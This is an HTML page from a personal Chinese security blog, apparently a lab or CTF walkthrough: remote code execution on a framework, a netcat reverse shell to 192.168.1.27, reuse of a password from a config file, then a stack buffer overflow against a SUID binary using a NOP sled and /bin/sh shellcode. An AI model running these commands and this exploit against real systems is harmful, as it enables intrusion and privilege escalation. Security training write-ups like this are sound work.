@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>缓冲区溢出 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.存在框架漏洞（rce）
+
+2.通过rce反弹shell
+bash方法：
+
+nc方法：
+nc 192.168.1.27 12345 -e /bin/sh
+
+3.通过配置文件中的用户密码切换用户
+
+4.进入用户目录
+cat note.txt..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">缓冲区溢出</h2>
+            <div class="post-date">2023-01-05</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/huan-chong-qu-yi-chu.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p><strong>1.存在框架漏洞（rce）</strong><br>
+<img src="https://dydydy123.github.io/post-images/1672893708124.png" alt="" loading="lazy"></p>
+<p><strong>2.通过rce反弹shell</strong><br>
+bash方法：<br>
+<img src="https://dydydy123.github.io/post-images/1672893764946.png" alt="" loading="lazy"></p>
+<p>nc方法：</p>
+<pre><code>nc 192.168.1.27 12345 -e /bin/sh
+</code></pre>
+<p>3.通过配置文件中的用户密码切换用户<br>
+<img src="https://dydydy123.github.io/post-images/1672894030969.png" alt="" loading="lazy"></p>
+<p>4.进入用户目录</p>
+<pre><code>cat note.txt
+buffer overflow is the way. ( ° ʖ °)
+
+if you're new on 32bit bof then check these:
+
+https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html
+https://samsclass.info/127/proj/lbuf1.htm
+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1672897546043.png" alt="" loading="lazy"></figure>
+<p>提示缓冲区溢出</p>
+<figure data-type="image" tabindex="2"><img src="https://dydydy123.github.io/post-images/1672897858769.png" alt="" loading="lazy"></figure>
+<p>然后发现input且具有suid权限</p>
+<figure data-type="image" tabindex="3"><img src="https://dydydy123.github.io/post-images/1672898132636.png" alt="" loading="lazy"></figure>
+<p>input 看上去是关于输入的命令，输入的字符过长报错，怀疑缓冲区溢出便在此处。</p>
+<p>5.判断溢出位置<br>
+先通过<code>msf-pattern_create -l 3000</code>生成用于确定偏移的字符串。<br>
+再通过 <code>msf-pattern_offset -q 0x41376641</code> 获取偏移量（该位置之后4字节为eip）<br>
+<img src="https://dydydy123.github.io/post-images/1672987587355.png" alt="" loading="lazy"></p>
+<p><code>info registers</code> ：查看内存信息<br>
+<code>x/40x $esp</code>： x/x 以十六进制输出,x/d 以十进制输出,x/c 以单字符输出<br>
+<img src="https://dydydy123.github.io/post-images/1672988465363.png" alt="" loading="lazy"></p>
+<p>6.将eip覆盖为esp的地址（将下一条命令的地址覆盖为esp中的恶意命令地址）<br>
+<strong>构造exp：</strong></p>
+<pre><code>for i in {1..10000};do (./input $(python -c'print &quot;A&quot;*171 + &quot;\x70\xac\xbc\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80&quot;'));done
+</code></pre>
+<p><code>\x70\xac\xbc\xbf</code> 为该次esp地址（目标上启用了 ASLR 每次分配地址随机），<code>\x90</code> 不做任何操作</p>
+<p><img src="https://dydydy123.github.io/post-images/1673163492941.png" alt="" loading="lazy"><br>
+<img src="https://dydydy123.github.io/post-images/1673163541298.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/fang-huo-qiang-pei-zhi/">
+                  <h3 class="post-title">
+                    防火墙配置
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
